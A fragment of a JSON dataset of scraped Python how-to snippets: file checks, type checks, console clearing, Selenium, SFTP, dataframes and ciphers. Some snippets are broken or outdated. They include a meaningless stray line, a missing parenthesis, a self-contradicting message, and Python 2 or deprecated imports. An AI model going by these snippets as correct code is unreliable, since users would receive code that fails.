    "description": "import os  os.path.exists(\"file.txt\") # Or folder, will return true or false\nimport os print(os.path.isdir(\"/home/el\")) print(os.path.exists(\"/home/el/myfile.txt\"))\nimport os.path  if os.path.isfile('filename.txt'):     print (\"File exist\") else:     print (\"File not exist\") \nos.path.isdir(\"/home/el\")\nimport os.path from os import path  def main():     print (\"File exists:\"+str(path.exists('guru99.txt')))    print (\"File exists:\" + str(path.exists('career.guru99.txt')))    print (\"directory exists:\" + str(path.exists('myDirectory')))  if __name__== \"__main__\":    main()\n",
    "reg_date": "2021-10-12T11:32:51.000Z"
  },
  {
    "id": 3083,
    "keyword": null,
    "link": null,
    "title": " python check if folder is empty",
    "description": "if not os.listdir('/home/varun/temp') :     print(\"Directory /home/varun/temp is empty\")\n'''     Check if a Directory is empty : Method 1 '''     if len(os.listdir('/home/varun/temp') ) == 0:     print(\"Directory is empty\") else:         print(\"Directory is not empty\")\n",
    "reg_date": "2021-10-12T11:32:51.000Z"
  },
  {
    "id": 3084,
    "keyword": null,
    "link": null,
    "title": " python check if has attribute",
    "description": "if hasattr(a, 'property'):     a.property\ntry:     doStuff(a.property) except AttributeError:     otherStuff()\n",
    "reg_date": "2021-10-12T11:32:51.000Z"
  },
  {
    "id": 3085,
    "keyword": null,
    "link": null,
    "title": " python check if internet is available",
    "description": "import urllib.request  def internet_on():     try:         urllib.request.urlopen('http://216.58.192.142', timeout=2)         return True     except:         return False\nimport urllib2  def internet_on():     try:         urllib2.urlopen('http://216.58.192.142', timeout=1)         return True     except urllib2.URLError as err:          return False\n",
    "reg_date": "2021-10-12T11:32:51.000Z"
  },
  {
    "id": 3086,
    "keyword": null,
    "link": null,
    "title": " python check if is infinity",
    "description": "\"Remember to import math!\" \"the math.isinf() can detect if it is an infinity ( - and + inf return true) import math x = math.inf y = -math.inf z = 222 print(math.isinf(x)) #Expected: True print(math.isinf(y)) #Expected: True print(math.isinf(z)) #Expected: False \"If you want to only allow +  infinity,\" def checkplusinf(x):   if(x > 0 and math.isinf(x) == True):     return True   else:     return False \"Or, for minus ifninify\" def checkminusinf(x):   if(x < 0 and math.isinf(x) == True):     return True   else:     return False \"If you want both\" def checkplusminusinf(x):   if(x > 0 and math.isinf(x) == True):     return \"input is infinity\"   elif(x < 0 and math.isinf(x) == True):     return \"input is -infinity\"   else:     return \"input is not infinity.\" print(checkplusminusinf(math.inf)) #Output: input is infinity print(checkplusminusinf(-math.inf)) #Output: input is -infinity print(checkplusminusinf(222)) #Output: input is not infinity print(checkminusinf(-math.inf)) #Output: True print(checkminusinf(math.inf)) #Output: False print(checkminusinf(222)) #Output: False print(checkplusinf(math.inf)) #Output: True print(checkplusinf(-math.inf)) #Output: False print(checkplusinf(222)) #Output: False\n",
    "reg_date": "2021-10-12T11:32:51.000Z"
  },
  {
    "id": 3087,
    "keyword": null,
    "link": null,
    "title": " python check if is pandas dataframe",
    "description": "import pandas as pd isinstance(df, pd.DataFrame)\n",
    "reg_date": "2021-10-12T11:32:51.000Z"
  },
  {
    "id": 3088,
    "keyword": null,
    "link": null,
    "title": " python check if list contains elements of another list",
    "description": "## checking any elment of list_B in list_A list_A = [1, 2, 3, 4]  list_B = [2, 3, 6]  check = any(item in list_A for item in list_B)  print(check) # True\n## checking all elements of list_B in list_A list_A = [1, 2, 3, 4] list_B = [2, 3]  check = all(item in list_A for item in list_B)  print(check) # True\n>>> items = set([-1, 0, 1, 2]) >>> set([1, 2]).issubset(items) True >>> set([1, 3]).issubset(items) False \n'''         check if list1 contains any elements of list2 ''' result =  any(elem in list1  for elem in list2) if result:     print(\"Yes, list1 contains any elements of list2\")     else :     print(\"No, list1 contains any elements of list2\")\n## using set list_A = [1, 2, 3, 4] list_B = [2, 3]  set_A = set(list_A) set_B = set(list_B)  print(set_A.intersection(set_B))  # True if there is any element same # False if there is no element same\n##Taking examples of two python lists.  ##Take examples of two lists.  list1 = [2,4,0,7,6] list2 = [1,0,9,7,6]  ##the statement for condition is.  check = any(element in list2 for element in list1)\n",
    "reg_date": "2021-10-12T11:32:52.000Z"
  },
  {
    "id": 3089,
    "keyword": null,
    "link": null,
    "title": " python check if number is complex",
    "description": ">>> isinstance(1j, complex) True\n",
    "reg_date": "2021-10-12T11:32:52.000Z"
  },
  {
    "id": 3090,
    "keyword": null,
    "link": null,
    "title": " python check if number is float or int",
    "description": "# check if a number is int or float  isinstance(x, int) # integer isinstance(x, float) # float  import numbers isinstance(x, numbers.Integral) # Long Int \ncheck_float = isinstance(25.9, float)\n",
    "reg_date": "2021-10-12T11:32:52.000Z"
  },
  {
    "id": 3091,
    "keyword": null,
    "link": null,
    "title": " python check if path does not exist",
    "description": "import os if not os.path.exists('my_folder'):     os.makedirs('my_folder')\ntry:     os.makedirs(\"path/to/directory\") except FileExistsError:     # directory already exists     pass \nstr = {cj} print = {str}\n",
    "reg_date": "2021-10-12T11:32:52.000Z"
  },
  {
    "id": 3092,
    "keyword": null,
    "link": null,
    "title": " python check if string is date format",
    "description": ">>> import datetime >>> def validate(date_text):     try:         datetime.datetime.strptime(date_text, '%Y-%m-%d')     except ValueError:         raise ValueError(\"Incorrect data format, should be YYYY-MM-DD\")   >>> validate('2003-12-23') >>> validate('2003-12-32')  Traceback (most recent call last):   File \"<pyshell#20>\", line 1, in <module>     validate('2003-12-32')   File \"<pyshell#18>\", line 5, in validate     raise ValueError(\"Incorrect data format, should be YYYY-MM-DD\") ValueError: Incorrect data format, should be YYYY-MM-DD\n",
    "reg_date": "2021-10-12T11:32:52.000Z"
  },
  {
    "id": 3093,
    "keyword": null,
    "link": null,
    "title": " python check if string is in input",
    "description": "try:    val = int(userInput) except ValueError:    print(\"That's not an int!\")\n",
    "reg_date": "2021-10-12T11:32:52.000Z"
  },
  {
    "id": 3094,
    "keyword": null,
    "link": null,
    "title": " python check if variable is array",
    "description": "isinstance([0, 10, 20, 30], list) \t\t# True isinstance(50, list)\t\t\t\t\t# False\n",
    "reg_date": "2021-10-12T11:32:52.000Z"
  },
  {
    "id": 3095,
    "keyword": null,
    "link": null,
    "title": " python check if variable is iterable",
    "description": "from collections import Iterable  def iterable(obj):     return isinstance(obj, Iterable)\ntry:   obj = iter(obj)     except:   raise TypeError(\"obj is not iterable\")    finally:   print (\"obj is iterable\")    from collections import Iterable  if isinstance(obj, Iterable):   print (\"obj is iterable\")    else:   print (\"obj is not iterable\")\n",
    "reg_date": "2021-10-12T11:32:52.000Z"
  },
  {
    "id": 3096,
    "keyword": null,
    "link": null,
    "title": " python check if variable is list",
    "description": "isinstance([0, 10, 20, 30], list) \t\t# True isinstance(50, list)\t\t\t\t\t# False\nlst = [0, 1, 2, 3] if isinstance(lst, list): \t# Is list\n",
    "reg_date": "2021-10-12T11:32:52.000Z"
  },
  {
    "id": 3097,
    "keyword": null,
    "link": null,
    "title": " python check if variable is list or not",
    "description": "isinstance([0, 10, 20, 30], list) \t\t# True isinstance(50, list)\t\t\t\t\t# False\n",
    "reg_date": "2021-10-12T11:32:52.000Z"
  },
  {
    "id": 3098,
    "keyword": null,
    "link": null,
    "title": " python check if variable is list or number",
    "description": "isinstance([0, 10, 20, 30], list) \t\t# True isinstance(50, list)\t\t\t\t\t# False\n",
    "reg_date": "2021-10-12T11:32:53.000Z"
  },
  {
    "id": 3099,
    "keyword": null,
    "link": null,
    "title": " python check if variable is list or string",
    "description": "isinstance([0, 10, 20, 30], list) \t\t# True isinstance(50, list)\t\t\t\t\t# False\n",
    "reg_date": "2021-10-12T11:32:53.000Z"
  },
  {
    "id": 3100,
    "keyword": null,
    "link": null,
    "title": " python check if variable is string",
    "description": "isinstance(s, str)\n# python 2 isinstance(s, basestring)  # python 3 isinstance(s, str)\ntype('hello world') == str # output: True  type(10) == str # output: False\n",
    "reg_date": "2021-10-12T11:32:53.000Z"
  },
  {
    "id": 3101,
    "keyword": null,
    "link": null,
    "title": " python check if variables are the same",
    "description": "values = [x, y, z]  # can contain any number of values if all(v == 1 for v in values):\n",
    "reg_date": "2021-10-12T11:32:53.000Z"
  },
  {
    "id": 3102,
    "keyword": null,
    "link": null,
    "title": " python check internet connection",
    "description": "import urllib.request  def internet_on():     try:         urllib.request.urlopen('http://216.58.192.142', timeout=2)         return True     except:         return False\nimport urllib2  def internet_on():     try:         urllib2.urlopen('http://216.58.192.142', timeout=1)         return True     except urllib2.URLError as err:          return False\n",
    "reg_date": "2021-10-12T11:32:53.000Z"
  },
  {
    "id": 3103,
    "keyword": null,
    "link": null,
    "title": " python check is os is windows",
    "description": "from sys import platform if platform == \"linux\" or platform == \"linux2\":     # linux elif platform == \"darwin\":     # OS X elif platform == \"win32\":     # Windows...\n",
    "reg_date": "2021-10-12T11:32:53.000Z"
  },
  {
    "id": 3104,
    "keyword": null,
    "link": null,
    "title": " python check key press",
    "description": "import keyboard # if key 'a' is pressed  if keyboard.is_pressed('a'): \tprint('a key has ben pressed')\nimport keyboard  # using module keyboard while True:  # making a loop     try:  # used try so that if user pressed other than the given key error will not be shown         if keyboard.is_pressed('q'):  # if key 'q' is pressed              print('You Pressed A Key!')             break  # finishing the loop     except:         break  # if user pressed a key other than the given key the loop will break\n# pip3 install pynput  from pynput.keyboard import Key, Listener   def show(key):      pressed_key = str(key).replace(\"'\", \"\")     print(\" key: \", pressed_key)      if key == Key.esc:         # Stop listener         return False   # Listener with Listener(on_press=show) as listener:     listener.join() \n",
    "reg_date": "2021-10-12T11:32:53.000Z"
  },
  {
    "id": 3105,
    "keyword": null,
    "link": null,
    "title": " python check key pressed linux",
    "description": "# pip3 install pynput  from pynput.keyboard import Key, Listener   def show(key):      pressed_key = str(key).replace(\"'\", \"\")     print(\" key: \", pressed_key)      if key == Key.esc:         # Stop listener         return False   # Listener with Listener(on_press=show) as listener:     listener.join() \n",
    "reg_date": "2021-10-12T11:32:53.000Z"
  },
  {
    "id": 3106,
    "keyword": null,
    "link": null,
    "title": " python check list contains another list",
    "description": "## checking any elment of list_B in list_A list_A = [1, 2, 3, 4]  list_B = [2, 3, 6]  check = any(item in list_A for item in list_B)  print(check) # True\n>>> items = set([-1, 0, 1, 2]) >>> set([1, 2]).issubset(items) True >>> set([1, 3]).issubset(items) False \n'''         check if list1 contains any elements of list2 ''' result =  any(elem in list1  for elem in list2) if result:     print(\"Yes, list1 contains any elements of list2\")     else :     print(\"No, list1 contains any elements of list2\")\n## using set list_A = [1, 2, 3, 4] list_B = [2, 3]  set_A = set(list_A) set_B = set(list_B)  print(set_A.intersection(set_B))  # True if there is any element same # False if there is no element same\n",
    "reg_date": "2021-10-12T11:32:54.000Z"
  },
  {
    "id": 3107,
    "keyword": null,
    "link": null,
    "title": " python check my gpu",
    "description": "from tensorflow.python.client import device_lib  def get_available_gpus():     local_device_protos = device_lib.list_local_devices()     return [x.name for x in local_device_protos if x.device_type == 'GPU'] \n",
    "reg_date": "2021-10-12T11:32:54.000Z"
  },
  {
    "id": 3108,
    "keyword": null,
    "link": null,
    "title": " python check namespace has instance",
    "description": "if hasattr(a, 'property'):     a.property\n",
    "reg_date": "2021-10-12T11:32:54.000Z"
  },
  {
    "id": 3109,
    "keyword": null,
    "link": null,
    "title": " python check ram usage",
    "description": "import psutil # Can be found at https://pypi.org/project/psutil/  psutil.virtual_memory()\n#!/usr/bin/env python import psutil # gives a single float value psutil.cpu_percent() # gives an object with many fields psutil.virtual_memory() # you can convert that object to a dictionary  dict(psutil.virtual_memory()._asdict())\n$ pip install line_profiler \n",
    "reg_date": "2021-10-12T11:32:54.000Z"
  },
  {
    "id": 3110,
    "keyword": null,
    "link": null,
    "title": " python check variable is list or not",
    "description": "isinstance([0, 10, 20, 30], list) \t\t# True isinstance(50, list)\t\t\t\t\t# False\n",
    "reg_date": "2021-10-12T11:32:54.000Z"
  },
  {
    "id": 3111,
    "keyword": null,
    "link": null,
    "title": " python check version",
    "description": "# To check your Python version in the command line use: python --version  # To check your Python verson inside a script use: import sys print(sys.version)\npython --version\n# To check Python version  python -V ----or---- python --version\npython --version #in command line  python #or by enterng interactiv mode\npython3 --versionpip3 --version\nStep 1: Type Command Prompt on search icon near the windows icon Step 2: On Command Prompt Execute the below command Step 3: python --version\n",
    "reg_date": "2021-10-12T11:32:54.000Z"
  },
  {
    "id": 3112,
    "keyword": null,
    "link": null,
    "title": " python check whether a file exists without exception",
    "description": "import os.path os.path.exists(file_path)\n",
    "reg_date": "2021-10-12T11:32:54.000Z"
  },
  {
    "id": 3113,
    "keyword": null,
    "link": null,
    "title": " python choose random element from list",
    "description": "import random  #1.A single element random.choice(list)  #2.Multiple elements with replacement random.choices(list, k = 4)  #3.Multiple elements without replacement random.sample(list, 4)\nimport random  list = [\"Item 1\", \"Item 2\", \"Item 3\"]\t\t\t# List item = random.choice(list)\t\t\t\t\t\t# Chooses from list print(item)\t\t\t\t\t# Prints choice  # From stackoverflow # Tried and tested method\nimport random  foo = ['a', 'b', 'c', 'd', 'e'] print(random.choice(foo))\nrandom.choice(name of list)\nimport random #dictionary x_dict = {30:60, 20:40,10:20} key = random.choice(list(x_dict)) print (key)#if you want it to print 30, 20, or 10 print (x_dict[key])#if you want it to print 60, 40, or 20 print (key,\"-\", x_dict[key])# if you want to print 30 - 60, 20-40,or 10-20\nimport random  # with replacement = same item CAN be chosen more than once. # without replacement = same item CANNOT be chosen more then once.  # Randomly select 2 elements from list without replacement and return a list random.sample(list_name, 2)  # Randomly select 3 elements from list with replacement and return a list random.choices(set_name, k=3)  # Returns 1 random element from list random.choice(list_name)\n",
    "reg_date": "2021-10-12T11:32:54.000Z"
  },
  {
    "id": 3114,
    "keyword": null,
    "link": null,
    "title": " python chromedriver headless  selenium ",
    "description": "from selenium import webdriver from selenium.webdriver.chrome.options import Options  options = Options() options.headless = True driver = webdriver.Chrome(CHROMEDRIVER_PATH, chrome_options=options)\n",
    "reg_date": "2021-10-12T11:32:54.000Z"
  },
  {
    "id": 3115,
    "keyword": null,
    "link": null,
    "title": " python clamp",
    "description": "#Clamp function limits a value to a given range. Python doesn't have such a function in built. You can create this function like  def clamp(num, min_value, max_value):    return max(min(num, max_value), min_value) print(clamp(5, 1, 20)) print(clamp(1, 10, 20)) print(clamp(20, 1, 10))\n",
    "reg_date": "2021-10-12T11:32:55.000Z"
  },
  {
    "id": 3116,
    "keyword": null,
    "link": null,
    "title": " python class get attribute by name",
    "description": ">>> class c:         pass o = c() >>> setattr(o, \"foo\", \"bar\") >>> o.foo 'bar' >>> getattr(o, \"foo\") 'bar'\n",
    "reg_date": "2021-10-12T11:32:55.000Z"
  },
  {
    "id": 3117,
    "keyword": null,
    "link": null,
    "title": " python class typeerror module() takes at most 2 arguments (3 given)",
    "description": "this error is often due to the fact that the classes are at the same time modules  example:  let's create a file A.py (module) containing a class A and the same for B. If B extend from A then to import class A into B we do: from A_module import A_className   in our example:  the python code will be: import A from A class B(A): \t....\n",
    "reg_date": "2021-10-12T11:32:55.000Z"
  },
  {
    "id": 3118,
    "keyword": null,
    "link": null,
    "title": " python clear console",
    "description": "import sys, os  os.system('cls') \nImport os   os.system(\"clear\") # Linux - OSX os.system(\"cls\") # Windows\nprint('\\033[H\\033[J', end='')\nimport os  def clearConsole():     command = 'clear'     if os.name in ('nt', 'dos'):  # If Machine is running on Windows, use cls         command = 'cls'     os.system(command)  clearConsole() \nimport os  def clear():  # this function will clear the console     command = 'cls'  # cls is for windows     if os.name != 'nt':  # if it isnt windows it will use clear     \tcommand = 'clear'     os.system(command)     return 0    # example usage: name = input('whats your name?') clear() print('your name is: ' + name)\nimport sys  sys.stdout.flush()\n",
    "reg_date": "2021-10-12T11:32:55.000Z"
  },
  {
    "id": 3119,
    "keyword": null,
    "link": null,
    "title": " python clear the printed text",
    "description": "import os os.system('clear')\n",
    "reg_date": "2021-10-12T11:32:55.000Z"
  },
  {
    "id": 3120,
    "keyword": null,
    "link": null,
    "title": " python click buttons on websites",
    "description": "from selenium import webdriver import webbrowser  driver = webdriver.Chrome() driver.get(\"example.com\") button = driver.find_element_by_id('idofbutton') button.click()\n",
    "reg_date": "2021-10-12T11:32:55.000Z"
  },
  {
    "id": 3121,
    "keyword": null,
    "link": null,
    "title": " python click on screen",
    "description": "import pyautogui  pyautogui.click(100, 100) pyautogui.moveTo(100, 150) pyautogui.moveRel(0, 10)  # move mouse 10 pixels down pyautogui.dragTo(100, 150) pyautogui.dragRel(0, 10)  # drag mouse 10 pixels down\nimport mouse # Number of pixels to move by on x and y axis x = 1 y = 2 mouse.move(x, y)\nimport autopy # pip install autopy autopy.mouse.smooth_move(100, 600)\nimport pyautogui as pg clk= pg.locateOnScreen('click.png', confidence=0.9) pg.click(x=clk.left+int(clk.width/2), y=clk.top+int(clk.height/2))\n",
    "reg_date": "2021-10-12T11:32:55.000Z"
  },
  {
    "id": 3122,
    "keyword": null,
    "link": null,
    "title": " python clipboard to image",
    "description": "from PIL import ImageGrab image = ImageGrab.grabclipboard() image.save('clipboard.jpg','JPG')\n",
    "reg_date": "2021-10-12T11:32:55.000Z"
  },
  {
    "id": 3123,
    "keyword": null,
    "link": null,
    "title": " python clone object",
    "description": "import copy  new_ob = copy.deepcopy(old_ob)\n>>> import copy >>> nums = [1, 2, 3] >>> data = {'a': 10, 'b': nums} >>> data {'a': 10, 'b': [1, 2, 3]} >>> data_copy = copy.copy(data) >>> data_deep = copy.deepcopy(data) >>> data_copy {'a': 10, 'b': [1, 2, 3]} >>> data_deep {'a': 10, 'b': [1, 2, 3]} >>> data_copy['a'] += 2 >>> nums[1:1] = [254] >>> data {'a': 10, 'b': [1, 254, 2, 3]} >>> data_copy {'a': 12, 'b': [1, 254, 2, 3]} >>> data_deep {'a': 10, 'b': [1, 2, 3]}\n>>> import copy >>> a = 0 >>> b = 2 >>> a = copy.copy(b) >>> b += 1 >>> a 2 >>> b 3\nnew_list = list.copy()  # returns a new list without modifying the orginal list. \n",
    "reg_date": "2021-10-12T11:32:55.000Z"
  },
  {
    "id": 3124,
    "keyword": null,
    "link": null,
    "title": " python close all plot figures",
    "description": "import matplotlib.pyplot as plt plt.close('all')\n",
    "reg_date": "2021-10-12T11:32:55.000Z"
  },
  {
    "id": 3125,
    "keyword": null,
    "link": null,
    "title": " python cls statement using os module",
    "description": "import os os.system('cls')  # on windows \nimport os os.system('cls' if os.name == 'nt' else 'clear')\n",
    "reg_date": "2021-10-12T11:32:55.000Z"
  },
  {
    "id": 3126,
    "keyword": null,
    "link": null,
    "title": " python code for on mouse click release",
    "description": "from pynput.mouse import Button, Controller  mouse = Controller()  # Read pointer position print('The current pointer position is {0}'.format(     mouse.position))  # Set pointer position mouse.position = (10, 20) print('Now we have moved it to {0}'.format(     mouse.position))  # Move pointer relative to current position mouse.move(5, -5)  # Press and release mouse.press(Button.left) mouse.release(Button.left)  # Double click; this is different from pressing and releasing # twice on Mac OSX mouse.click(Button.left, 2)  # Scroll two steps down mouse.scroll(0, 2) \n",
    "reg_date": "2021-10-12T11:32:56.000Z"
  },
  {
    "id": 3127,
    "keyword": null,
    "link": null,
    "title": " python code for snowflake connection",
    "description": "import snowflake.connector  # Connectio string conn = snowflake.connector.connect(                 user='snuser',                 password='password@123',                 account='xyz12345.us-east-2',                 #warehouse='COMPUTE_WH',                 database='DEMO_DB',                 schema='public'                 )  # Create cursor cur = conn.cursor()  # Execute SQL statement cur.execute(\"select current_date;\")  # Fetch result print cur.fetchone()[0]\npip install -r https://raw.githubusercontent.com/snowflakedb/snowflake-connector-python/v2.3.8/tested_requirements/requirements_36.reqs\n",
    "reg_date": "2021-10-12T11:32:56.000Z"
  },
  {
    "id": 3128,
    "keyword": null,
    "link": null,
    "title": " python code for system of odes",
    "description": "    u_star = u[k] + dt*f(u[k], t[k])     u[k+1] = u[k] + 0.5*dt*f(u[k], t[k]) + 0.5*dt*f(u_star, t[k+1]) ## function argument as list items\n",
    "reg_date": "2021-10-12T11:32:56.000Z"
  },
  {
    "id": 3129,
    "keyword": null,
    "link": null,
    "title": " python code to convert all keys of dict into lowercase",
    "description": "my_dict = {'KEY1': \"Hello\", 'Key2': \"World\"}  new_dict = dict((k.lower(), v) for k, v in my_dict .items())  print(new_dict\n",
    "reg_date": "2021-10-12T11:32:56.000Z"
  },
  {
    "id": 3130,
    "keyword": null,
    "link": null,
    "title": " python code to drop columns from dataframe",
    "description": "df.drop(['column_1', 'Column_2'], axis = 1, inplace = True) \n# Let df be a dataframe # Let new_df be a dataframe after dropping a column  new_df = df.drop(labels='column_name', axis=1)  # Or if you don't want to change the name of the dataframe df = df.drop(labels='column_name', axis=1)  # Or to remove several columns df = df.drop(['list_of_column_names'], axis=1)  # axis=0 for 'rows' and axis=1 for columns\n",
    "reg_date": "2021-10-12T11:32:56.000Z"
  },
  {
    "id": 3131,
    "keyword": null,
    "link": null,
    "title": " python code to open windows command prompt",
    "description": "import os def mycmd():     os.system('cmd /c \"ipconfig\"') mycmd()\nimport subprocess subprocess.run([\"ls\", \"-l\"])\n",
    "reg_date": "2021-10-12T11:32:56.000Z"
  },
  {
    "id": 3132,
    "keyword": null,
    "link": null,
    "title": " python code to print hello world",
    "description": "print(\"Hello World!\")\nprint(\"Hello World\")\n  print(\"hello world\") or print('HELLO WORLD') or print(\"HELLO WORLD\") or print('hello world')\n# This program prints Hello, world!  print('Hello, world!') \n#The real way :) print(\"Hello World!\")\nprint('Hello World!')\n",
    "reg_date": "2021-10-12T11:32:56.000Z"
  },
  {
    "id": 3133,
    "keyword": null,
    "link": null,
    "title": " python code to wait",
    "description": "# You need to import time first import time #now you have time you can make time wait/sleep time.sleep(10) #time will wait/sleep for 10 seconds\n#Wait in python #Module required - time import time #Wait in for the time you put time.sleep(0.5) print('Wait in python')\n",
    "reg_date": "2021-10-12T11:32:56.000Z"
  },
  {
    "id": 3134,
    "keyword": null,
    "link": null,
    "title": " python color in console",
    "description": "class bcolors:     HEADER = '\\033[95m'     OKBLUE = '\\033[94m'     OKGREEN = '\\033[92m'     WARNING = '\\033[93m'     FAIL = '\\033[91m'     ENDC = '\\033[0m'     BOLD = '\\033[1m'     UNDERLINE = '\\033[4m'  print(f\"{bcolors.WARNING}Error : Test message !{bcolors.ENDC}\")\n",
    "reg_date": "2021-10-12T11:32:56.000Z"
  },
  {
    "id": 3135,
    "keyword": null,
    "link": null,
    "title": " python color text on windows",
    "description": "import termcolor import os os.system('color') print(termcolor.colored(\"I want to help\", \"red\"))\nimport os # To get all possible colors for the command line, open the command prompt # and enter the command \"color help\" os.system('color FF')\n",
    "reg_date": "2021-10-12T11:32:56.000Z"
  },
  {
    "id": 3136,
    "keyword": null,
    "link": null,
    "title": " python columnar cipher",
    "description": "def columnar_encrypt(text, key):     m = { i : [] for i in key }     cols = [list(text[j:j+len(key)]) for j in range(0, len(text), len(key))]     if len(cols[-1]) < len(key):         while len(cols[-1]) != len(key):             cols[-1].append(' ')     i = 0     for k in m.keys():         if i < len(key):             for j in cols:                 m[k] += j[i]             i += 1     s = {k : m[k] for k in sorted(m)}     cipher = ''     for i in s.keys():         for x in s[i]:             cipher += x     print(m)     return cipher  def columnar_decrypt(cipher, key):     if len(cipher) < len(key):         key = key[:len(cipher)]     n = len(cipher) // len(key)     s = { k : [] for k in sorted(key) }     cols = [cipher[j:j+n] for j in range(0, len(cipher), n)]         i = 0     for k in s.keys():         if i < len(key):             s[k] = list(cols[i])             i += 1     m = {}       for k in key:         m[k] = s[k]     o = m     plain = ''     import pandas as pd     m = pd.DataFrame(m)     for i in m.itertuples():         for j in i[1:]:             plain += j     print(s, '\\n')     return plain.strip()\ndef columnar_encrypt():     plain = input(\"Enter the plain text: \").replace(' ', '')     key = list(input(\"Enter the plain text: \").lower())     rowSize = len((key))     m = [(list(plain[i: i + rowSize])) for i in range(0, len(plain), rowSize)]     for i in m:         if len(i) != rowSize:             while len(i) != rowSize:                 i.append('')         print(i)     key_sort = []     for i in sorted(key):         key_sort.append(key.index(i))         key[key.index(i)] = ''     print(key_sort)     cipher = []     for i in key_sort:         for j in range(len(m)):             if m[j][i] is not '':                    cipher.append(m[j][i])     return 'Cipher Text: Read if you can: {0}'.format(''.join(cipher))\n",
    "reg_date": "2021-10-12T11:32:56.000Z"
  },
  {
    "id": 3137,
    "keyword": null,
    "link": null,
    "title": " python combine side by side dataframes",
    "description": "pd.concat([df1, df2], axis=1)\n",
    "reg_date": "2021-10-12T11:32:57.000Z"
  },
  {
    "id": 3138,
    "keyword": null,
    "link": null,
    "title": " python compare two json objects and get difference",
    "description": "# import this package and see the difference from jsondiff import diff diff(json1, json2)\n",
    "reg_date": "2021-10-12T11:32:57.000Z"
  },
  {
    "id": 3139,
    "keyword": null,
    "link": null,
    "title": " python condition if dataype",
    "description": "if isinstance(x, int):\n",
    "reg_date": "2021-10-12T11:32:57.000Z"
  },
  {
    "id": 3140,
    "keyword": null,
    "link": null,
    "title": " python config file",
    "description": "''' config.cfg [whatever] key=qwerertyertywert2345 secret=sadfgwertgrtujdfgh '''  from configparser import ConfigParser  config = ConfigParser() config.read('config.cfg')  my_key = config['whatever']['key'] my_secret = config['whatever']['secret']\nfrom ConfigParser import SafeConfigParser  parser = SafeConfigParser() parser.read('simple.ini')  print parser.get('bug_tracker', 'url') \n",
    "reg_date": "2021-10-12T11:32:57.000Z"
  },
  {
    "id": 3141,
    "keyword": null,
    "link": null,
    "title": " python connect sftp with key",
    "description": "import pysftp  def upload_file(file_path):      private_key = \"~/.ssh/your-key.pem\"  # can use password keyword in Connection instead     srv = pysftp.Connection(host=\"your-host\", username=\"user-name\", private_key=private_key)     srv.chdir('/var/web/public_files/media/uploads')  # change directory on remote server     srv.put(file_path)  # To download a file, replace put with get     srv.close()  # Close connection\n",
    "reg_date": "2021-10-12T11:32:57.000Z"
  },
  {
    "id": 3142,
    "keyword": null,
    "link": null,
    "title": " python console pause",
    "description": "def pause(massage = 'press any key to continue'):  # this function will pause the script with a default massage or a custome one.     print(massage)     os.system('pause >NULL')  # this will pause untill any key is pressed.     return 0    # example usage: print('hello')  # prints hello. pause()  # waits untill the user presses a key. print('world!')  # then prints world!\n# To delay excusion use the time library import time  time.sleep(secs)\n# Don't use os.system(\"pause\"), it is very slow because it needs to create # an entire shell process. Use this instead:  import getch  def pause():   print(\"Press any key to continue . . . \")   getch.getch()\n",
    "reg_date": "2021-10-12T11:32:57.000Z"
  },
  {
    "id": 3143,
    "keyword": null,
    "link": null,
    "title": " python continue vs pass",
    "description": "Yes, there is a difference.   continue forces the loop to start at the next iteration  while pass means \"there is no code to execute here\"  and will continue through the remainder or the loop body.  continue will jump back to the top of the loop.  pass will continue processing. https://stackoverflow.com/questions/9483979/is-there-a-difference-between-continue-and-pass-in-a-for-loop-in-python\nfor element in some_list:     if not element:         pass     print 1 # will print after pass  for element in some_list:    if not element:        continue    print 1 # will not print after continue\n",
    "reg_date": "2021-10-12T11:32:57.000Z"
  },
  {
    "id": 3144,
    "keyword": null,
    "link": null,
    "title": " python convert a string of tuples to a tuple of tuples",
    "description": "# Basic syntax: import ast ast.literal_eval(your_string)  # Example usage: # Say you want to convert a string like: '(0,0,0), (0,0,1), (1,1,0)' # or like '((0,0,0), (0,0,1), (1,1,0))' # to a tuple of tuples like: ((0,0,0), (0,0,1), (1,1,0))  # Import the Abstract Syntax Trees package: import ast your_string = '(0,0,0), (0,0,1), (1,1,0)'  # Convert to tuple of tuples: your_tuple = ast.literal_eval(your_string) print(your_tuple) --> ((0,0,0), (0,0,1), (1,1,0))\n",
    "reg_date": "2021-10-12T11:32:57.000Z"
  },
  {
    "id": 3145,
    "keyword": null,
    "link": null,
    "title": " python convert between list numpy array and pandas series",
    "description": "# Basic syntax: array = numpy.array(list) \t# Convert list to NumPy array list = array.tolist()\t\t# Convert NumPy array to list series = pandas.series(list) # Convert list to Pandas series list = series.tolist()\t\t# Convert Pandas series to list array = series.to_numpy()\t# Convert Pandas series to NumPy array series = pandas.Series(array) # Convert NumPy array to Pandas series  # Note, you need to import the NumPy and Pandas packages for this to work\n",
    "reg_date": "2021-10-12T11:32:57.000Z"
  },
  {
    "id": 3146,
    "keyword": null,
    "link": null,
    "title": " python convert binary / hexadecimal / decimal to binary / hexadecimal / decimal",
    "description": "## First install the module coden with pip in cmd # pip install coden  ## import module import coden  ## Convert  # Binary to Decimal ans = coden.bin_to_int(number) # Binary to Hexadecimal ans = coden.bin_to_hex(number)  # Hexadecimal to Decimal ans = coden.hex_to_int(number) # Hexadecimal to Binary ans = coden.hex_to_bin(number)  # Decimal to Binary ans = coden.int_to_bin(number) # Decimal to Hexadecimal ans = coden.int_to_hex(number)   # Thank you!\n    hex(x) being x the integer you want to convert \ndec =13 print(bin(dec),oct(dec),hex(dec))\t\t#prints decimal,octal,hexadecimal value of 13\n",
    "reg_date": "2021-10-12T11:32:57.000Z"
  },
  {
    "id": 3147,
    "keyword": null,
    "link": null,
    "title": " python convert categorical data to one-hot encoding",
    "description": "# Basic syntax: df_onehot = pd.get_dummies(df, columns=['col_name'], prefix=['one_hot']) # Where: #\t- get_dummies creates a one-hot encoding for each unique categorical #\t\tvalue in the column named col_name #\t- The prefix is added at the beginning of each categorical value  #\t\tto create new column names for the one-hot columns  # Example usage: # Build example dataframe: df = pd.DataFrame(['sunny', 'rainy', 'cloudy'], columns=['weather']) print(df)   weather 0   sunny 1   rainy 2  cloudy  # Convert categorical weather variable to one-hot encoding: df_onehot = pd.get_dummies(df, columns=['weather'], prefix=['one_hot']) print(df_onehot) \tone_hot_cloudy\t one_hot_rainy   one_hot_sunny 0                0               0               1 1                0               1               0 2                1               0               0\n",
    "reg_date": "2021-10-12T11:32:58.000Z"
  },
  {
    "id": 3148,
    "keyword": null,
    "link": null,
    "title": " python convert current datetime to rfc 1123 format",
